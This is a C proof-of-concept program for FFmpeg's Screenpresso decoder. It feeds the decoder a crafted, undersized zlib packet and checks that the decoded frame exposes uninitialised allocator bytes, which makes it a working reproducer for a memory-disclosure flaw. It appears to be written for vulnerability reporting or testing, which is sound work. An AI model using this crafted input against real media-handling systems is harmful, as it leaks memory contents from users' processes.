#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/packet.h"
#include "libavutil/frame.h"

#include <zlib.h>

#define WIDTH 4
#define HEIGHT 1
#define COMPONENT_SIZE 3
#define INFLATED_CAPACITY (WIDTH * HEIGHT * 4)
#define RAW_SIZE 3
#define COPY_SIZE (WIDTH * COMPONENT_SIZE)
#define DISCLOSED_SIZE (COPY_SIZE - RAW_SIZE)

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_SCREENPRESSO);
    AVCodecContext *context = NULL;
    AVPacket *packet = NULL;
    AVFrame *frame = NULL;
    const uint8_t raw[RAW_SIZE] = { 0x11, 0x22, 0x33 };
    uint8_t compressed[128];
    uLongf compressed_size = sizeof(compressed) - 2;
    int disclosed = 0;
    int ret = 1;

    if (!codec ||
        compress2(compressed + 2, &compressed_size, raw, sizeof(raw),
                  Z_BEST_COMPRESSION) != Z_OK)
        goto done;

    /* Keyframe plus the component-size selector for three-byte BGR24. */
    compressed[0] = 1;
    compressed[1] = (COMPONENT_SIZE - 1) << 2;

    context = avcodec_alloc_context3(codec);
    packet = av_packet_alloc();
    frame = av_frame_alloc();
    if (!context || !packet || !frame)
        goto done;

    context->width = WIDTH;
    context->height = HEIGHT;
    if (avcodec_open2(context, codec, NULL) < 0 ||
        av_new_packet(packet, (int)compressed_size + 2) < 0)
        goto done;

    memcpy(packet->data, compressed, compressed_size + 2);
    if (avcodec_send_packet(context, packet) < 0 ||
        avcodec_receive_frame(context, frame) < 0)
        goto done;

    for (int i = RAW_SIZE; i < COPY_SIZE; i++)
        disclosed += frame->data[0][i] == 0xA5;

    fprintf(stderr,
            "codec=screenpresso width=%d height=%d component_size=%d "
            "inflated_capacity=%d decompressed=%d copied=%d disclosed=%d\n",
            WIDTH, HEIGHT, COMPONENT_SIZE, INFLATED_CAPACITY, RAW_SIZE,
            COPY_SIZE, DISCLOSED_SIZE);
    fprintf(stderr,
            "allocator_fill=a5 decoded_prefix=%02x%02x%02x "
            "disclosed_fill_bytes=%d expected=%d\n",
            frame->data[0][0], frame->data[0][1], frame->data[0][2],
            disclosed, DISCLOSED_SIZE);
    ret = frame->data[0][0] == raw[0] &&
          frame->data[0][1] == raw[1] &&
          frame->data[0][2] == raw[2] &&
          disclosed == DISCLOSED_SIZE ? 0 : 2;

done:
    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&context);
    return ret;
}
